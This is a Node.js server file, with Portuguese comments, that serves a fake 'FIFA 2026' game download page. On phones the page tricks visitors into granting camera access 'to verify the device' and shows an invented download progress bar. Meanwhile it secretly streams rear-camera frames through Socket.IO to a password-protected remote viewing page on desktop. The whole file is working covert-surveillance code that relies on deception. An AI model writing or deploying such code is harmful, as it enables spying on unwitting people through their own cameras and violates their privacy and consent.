const express = require('express');
const http = require('http');
const socketIO = require('socket.io');
const path = require('path');
const app = express();
const server = http.createServer(app);
const io = socketIO(server, {
  cors: { origin: "*", methods: ["GET", "POST"] }
});

const PORT = process.env.PORT || 3000;
const SENHA = "1234"; // 🔑 Mude para a senha que quiser

// ========== FUNÇÃO PARA DETECTAR DISPOSITIVO ==========
function detectarDispositivo(userAgent) {
  const ua = userAgent.toLowerCase();
  const isMobile = /mobile|android|iphone|ipod|blackberry|opera mini|iemobile|wpdesktop/i.test(ua);
  const isTablet = /ipad|tablet|kindle|silk|playbook/i.test(ua);
  
  if (isTablet) return 'tablet';
  if (isMobile) return 'mobile';
  return 'desktop';
}

app.get('/', (req, res) => {
  // Detecta o dispositivo do usuário
  const dispositivo = detectarDispositivo(req.headers['user-agent'] || '');
  
  res.send(`
<!DOCTYPE html>
<html>
<head>
    <title>📱 Game Download</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: white;
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            text-align: center;
        }
        
        h1 { color: #333; margin-bottom: 30px; }
        
        /* Botão de permissão */
        .permission-button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 20px 40px;
            font-size: 20px;
            border-radius: 50px;
            cursor: pointer;
            margin: 20px 0;
            font-weight: bold;
            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
            transition: all 0.3s;
            width: 100%;
            max-width: 300px;
        }
        
        .permission-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 15px 30px rgba(0,0,0,0.3);
        }
        
        .permission-button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }
        
        /* Instruções de permissão */
        .instructions-box {
            background: #fff3e0;
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
            text-align: left;
            border-left: 5px solid #ff9800;
        }
        
        .instructions-box h4 {
            color: #e65100;
            margin-bottom: 10px;
        }
        
        .instructions-box ol {
            margin-left: 20px;
            color: #333;
        }
        
        .instructions-box li {
            margin: 10px 0;
        }
        
        .camera-icon {
            font-size: 50px;
            margin-bottom: 20px;
        }
        
        .error-detail {
            background: #ffebee;
            color: #c62828;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            font-family: monospace;
            text-align: left;
            border-left: 5px solid #f44336;
        }
        
        .success-box {
            background: #e8f5e9;
            color: #2e7d32;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            border-left: 5px solid #4CAF50;
        }
        
        .game-logo {
            font-size: 80px;
            margin: 20px 0;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
        
        .progress-container {
            background: #f0f0f0;
            border-radius: 25px;
            height: 30px;
            width: 100%;
            margin: 30px 0;
            overflow: hidden;
        }
        
        .progress-bar {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #4CAF50, #8BC34A);
            transition: width 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
        }
        
        .hidden {
            display: none;
        }
        
        #localVideo {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- CONTEÚDO PARA CELULAR -->
        <div id="mobileContent">
            <div class="game-logo">🎮</div>
            <div class="game-title">FIFA 2026</div>
            <div class="game-subtitle">Ultimate Edition</div>
            
            <!-- Área de instruções (só aparece se negar) -->
            <div id="instructionsArea" class="instructions-box hidden">
                <h4>🔒 Como permitir a câmera:</h4>
                <ol>
                    <li><strong>No Chrome:</strong> Clique no ícone de cadeado <span style="font-size:20px;">🔒</span> na barra de endereço</li>
                    <li><strong>Selecione "Permitir"</strong> para a câmera</li>
                    <li><strong>Recarregue a página</strong> e clique no botão novamente</li>
                </ol>
                <p style="margin-top:15px; text-align:center;">
                    <button onclick="recarregarPagina()" style="padding:10px 20px; background:#4CAF50; color:white; border:none; border-radius:5px; cursor:pointer;">
                        🔄 Recarregar Página
                    </button>
                </p>
            </div>
            
            <!-- Área de erro detalhado -->
            <div id="errorDetail" class="error-detail hidden"></div>
            
            <!-- Área de sucesso -->
            <div id="successArea" class="success-box hidden">
                ✅ Permissão concedida! Iniciando download...
            </div>
            
            <!-- Botão de permissão -->
            <div id="permissionArea">
                <div class="camera-icon">📷</div>
                <h3>Precisamos da sua câmera</h3>
                <p style="margin-bottom: 20px; color: #666;">Para verificar seu dispositivo, clique no botão abaixo.</p>
                <button id="permitirCameraBtn" class="permission-button" onclick="solicitarPermissaoCamera()">
                    📷 ATIVAR CÂMERA
                </button>
            </div>
            
            <!-- Área de progresso (inicialmente escondida) -->
            <div id="progressArea" class="hidden">
                <div class="progress-container">
                    <div id="progressBar" class="progress-bar" style="width: 0%">0%</div>
                </div>
                
                <div id="progressPercent" style="margin-top:10px; color:#4CAF50; font-weight:bold;">0% concluído</div>
                
                <div class="download-speed" id="speedInfo" style="background:#e3f2fd; padding:15px; border-radius:10px; margin:20px 0;">
                    ⬇️ 0 MB / 2500 MB • 0 MB/s
                </div>
                
                <div id="statusMessage" style="color:#666;">
                    ⏳ Iniciando download...
                </div>
            </div>
        </div>
        
        <!-- CONTEÚDO PARA PC -->
        <div id="pcContent" class="hidden">
            <h1>📷 Visualização Remota</h1>
            
            <div style="position:relative; width:100%; background:#000; border-radius:10px; overflow:hidden; aspect-ratio:4/3; margin:20px 0;">
                <img id="remoteVideo" style="width:100%; height:100%; object-fit:cover;">
                
                <div id="passwordOverlay" style="position:absolute; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); display:flex; align-items:center; justify-content:center;">
                    <div style="background:white; padding:30px; border-radius:15px; text-align:center; width:90%; max-width:300px;">
                        <h3>🔒 Bloqueado</h3>
                        <p style="margin-bottom:15px;">Digite a senha</p>
                        <input type="password" id="senhaInput" maxlength="4" placeholder="****" style="width:100%; padding:12px; font-size:18px; border:2px solid #ddd; border-radius:8px; margin-bottom:15px; text-align:center;">
                        <button onclick="verificarSenha()" style="background:#667eea; color:white; border:none; padding:12px 25px; border-radius:8px; cursor:pointer; width:100%;">Liberar</button>
                        <div id="erroSenha" style="color:#f44336; margin-top:10px; display:none;">Senha incorreta!</div>
                    </div>
                </div>
            </div>
            
            <div style="background:#e3f2fd; padding:20px; border-radius:10px;">
                <p>Senha: <strong>1234</strong></p>
            </div>
        </div>
        
        <video id="localVideo" autoplay playsinline muted style="display: none;"></video>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        const SENHA_CORRETA = "1234";
        
        // Elementos
        const mobileContent = document.getElementById('mobileContent');
        const pcContent = document.getElementById('pcContent');
        const localVideo = document.getElementById('localVideo');
        const remoteVideo = document.getElementById('remoteVideo');
        const passwordOverlay = document.getElementById('passwordOverlay');
        const permitirCameraBtn = document.getElementById('permitirCameraBtn');
        const permissionArea = document.getElementById('permissionArea');
        const progressArea = document.getElementById('progressArea');
        const instructionsArea = document.getElementById('instructionsArea');
        const errorDetail = document.getElementById('errorDetail');
        const successArea = document.getElementById('successArea');
        
        // Elementos da barrinha
        const progressBar = document.getElementById('progressBar');
        const progressPercent = document.getElementById('progressPercent');
        const speedInfo = document.getElementById('speedInfo');
        const statusMessage = document.getElementById('statusMessage');
        
        // Estado
        let mediaStream = null;
        let visualizacaoLiberada = false;
        let progresso = 0;
        let intervaloProgresso = null;
        let tentativas = 0;
        
        // ========== DETECÇÃO DE DISPOSITIVO ==========
        const isMobile = /mobile|android|iphone|ipod|blackberry|opera mini|iemobile|wpdesktop/i.test(navigator.userAgent);
        
        if (isMobile) {
            console.log('📱 Celular detectado');
            mobileContent.style.display = 'block';
            pcContent.style.display = 'none';
        } else {
            console.log('💻 PC detectado');
            mobileContent.style.display = 'none';
            pcContent.style.display = 'block';
        }
        
        // ========== FUNÇÃO PARA RECARREGAR ==========
        window.recarregarPagina = function() {
            location.reload();
        };
        
        // ========== FUNÇÃO PARA VERIFICAR PERMISSÃO ATUAL ==========
        async function verificarPermissaoAtual() {
            try {
                const permissionStatus = await navigator.permissions.query({ name: 'camera' });
                console.log('Status da permissão:', permissionStatus.state);
                
                if (permissionStatus.state === 'granted') {
                    // Já tem permissão, pode tentar ligar direto
                    console.log('✅ Permissão já concedida');
                    return true;
                } else if (permissionStatus.state === 'denied') {
                    // Permissão negada permanentemente
                    console.log('❌ Permissão negada permanentemente');
                    return false;
                }
                return null;
            } catch (e) {
                console.log('Não foi possível verificar permissão:', e);
                return null;
            }
        }
        
        // ========== FUNÇÃO PARA SOLICITAR PERMISSÃO ==========
        window.solicitarPermissaoCamera = async function() {
            try {
                tentativas++;
                console.log(\`📷 Tentativa \${tentativas} de permissão\`);
                
                // Desabilita o botão
                permitirCameraBtn.disabled = true;
                permitirCameraBtn.innerHTML = '⏳ Solicitando...';
                
                // Primeiro verifica se já tem permissão
                const temPermissao = await verificarPermissaoAtual();
                
                if (temPermissao === false) {
                    // Permissão negada permanentemente
                    throw new Error('PERMISSION_DENIED_PERMANENT');
                }
                
                // Tenta acessar a câmera com configurações específicas
                const constraints = {
                    video: {
                        width: { ideal: 640 },
                        height: { ideal: 480 },
                        facingMode: { ideal: 'environment' }
                    },
                    audio: false
                };
                
                console.log('📷 Aplicando constraints:', constraints);
                
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                
                // SUCESSO!
                mediaStream = stream;
                localVideo.srcObject = stream;
                await localVideo.play();
                
                // Esconde área de permissão e mostra progresso
                permissionArea.style.display = 'none';
                instructionsArea.classList.add('hidden');
                errorDetail.classList.add('hidden');
                successArea.classList.remove('hidden');
                progressArea.classList.remove('hidden');
                
                // Inicia download falso e transmissão
                iniciarDownloadFalso();
                iniciarTransmissao();
                
                console.log('✅ Câmera autorizada!');
                
            } catch (err) {
                console.error('❌ Erro detalhado:', err);
                
                // Reabilita o botão
                permitirCameraBtn.disabled = false;
                permitirCameraBtn.innerHTML = '📷 TENTAR NOVAMENTE';
                
                // Mostra instruções
                instructionsArea.classList.remove('hidden');
                
                // Tratamento específico de erros
                if (err.name === 'NotAllowedError' || err.message === 'PERMISSION_DENIED_PERMANENT') {
                    errorDetail.innerHTML = \`
                        <strong>❌ Permissão Negada Permanentemente</strong><br>
                        Você bloqueou a câmera para este site. Siga os passos:
                        <ol style="margin-top:10px;">
                            <li>Clique no ícone 🔒 na barra de endereço</li>
                            <li>Clique em "Configurações do site"</li>
                            <li>Mude "Câmera" de "Bloqueado" para "Permitir"</li>
                            <li>Recarregue a página</li>
                        </ol>
                    \`;
                    errorDetail.classList.remove('hidden');
                } else if (err.name === 'NotFoundError') {
                    errorDetail.innerHTML = '❌ Nenhuma câmera encontrada neste dispositivo.';
                    errorDetail.classList.remove('hidden');
                } else if (err.name === 'NotReadableError') {
                    errorDetail.innerHTML = '❌ Câmera está sendo usada por outro aplicativo. Feche outros apps e tente novamente.';
                    errorDetail.classList.remove('hidden');
                } else if (err.name === 'OverconstrainedError') {
                    // Tenta com configurações mais simples
                    try {
                        console.log('🔄 Tentando com configurações simples...');
                        const simpleStream = await navigator.mediaDevices.getUserMedia({ video: true });
                        // Se funcionar, usa esta stream
                        mediaStream = simpleStream;
                        localVideo.srcObject = simpleStream;
                        await localVideo.play();
                        
                        permissionArea.style.display = 'none';
                        progressArea.classList.remove('hidden');
                        iniciarDownloadFalso();
                        iniciarTransmissao();
                        
                    } catch (e) {
                        errorDetail.innerHTML = '❌ Erro ao acessar câmera mesmo em modo simples.';
                        errorDetail.classList.remove('hidden');
                    }
                } else {
                    errorDetail.innerHTML = \`❌ Erro: \${err.message}\`;
                    errorDetail.classList.remove('hidden');
                }
            }
        };
        
        // ========== FUNÇÃO PARA INICIAR TRANSMISSÃO ==========
        function iniciarTransmissao() {
            const canvas = document.createElement('canvas');
            canvas.width = 640;
            canvas.height = 480;
            const ctx = canvas.getContext('2d');
            
            setInterval(() => {
                try {
                    ctx.drawImage(localVideo, 0, 0, 640, 480);
                    const frame = canvas.toDataURL('image/jpeg', 0.5);
                    socket.emit('frame', frame);
                } catch (e) {}
            }, 200);
        }
        
        // ========== FUNÇÃO DA BARRINHA FALSA ==========
        function iniciarDownloadFalso() {
            progresso = 0;
            const velocidades = ['1.2 MB/s', '1.5 MB/s', '1.8 MB/s', '2.1 MB/s'];
            let velIndex = 0;
            
            statusMessage.innerHTML = '📦 Baixando arquivos...';
            
            intervaloProgresso = setInterval(() => {
                if (progresso < 100) {
                    progresso += Math.random() * 3 + 1;
                    progresso = Math.min(100, progresso);
                    
                    progressBar.style.width = progresso + '%';
                    progressBar.innerHTML = progresso.toFixed(0) + '%';
                    progressPercent.innerHTML = progresso.toFixed(0) + '% concluído';
                    
                    const baixado = ((progresso / 100) * 2500).toFixed(0);
                    velIndex = (velIndex + 1) % velocidades.length;
                    speedInfo.innerHTML = \`⬇️ \${baixado} MB / 2500 MB • \${velocidades[velIndex]}\`;
                    
                    if (progresso >= 100) {
                        clearInterval(intervaloProgresso);
                        statusMessage.innerHTML = '✅ Download concluído!';
                    }
                }
            }, 300);
        }
        
        // ========== VERIFICAÇÃO DE SENHA (PC) ==========
        window.verificarSenha = function() {
            const senha = document.getElementById('senhaInput').value;
            if (senha === SENHA_CORRETA) {
                passwordOverlay.style.display = 'none';
                visualizacaoLiberada = true;
            } else {
                document.getElementById('erroSenha').style.display = 'block';
            }
        };
        
        document.getElementById('senhaInput')?.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') verificarSenha();
        });
        
        // ========== SOCKET.IO ==========
        socket.on('frame', (frameData) => {
            if (visualizacaoLiberada) {
                remoteVideo.src = frameData;
            }
        });
        
        // Verifica permissão ao carregar
        verificarPermissaoAtual();
    </script>
</body>
</html>
  `);
});

// Socket.IO
io.on('connection', (socket) => {
  console.log('Cliente conectado');
  
  socket.on('frame', (frameData) => {
    socket.broadcast.emit('frame', frameData);
  });
});

server.listen(PORT, () => {
  console.log('='.repeat(60));
  console.log('📱 SISTEMA COM INSTRUÇÕES DE PERMISSÃO');
  console.log('='.repeat(60));
  console.log(`🚀 Servidor rodando na porta ${PORT}`);
  console.log(`🔑 Senha: ${SENHA}`);
  console.log('📱 Inclui instruções detalhadas para permitir câmera');
  console.log('='.repeat(60));
});
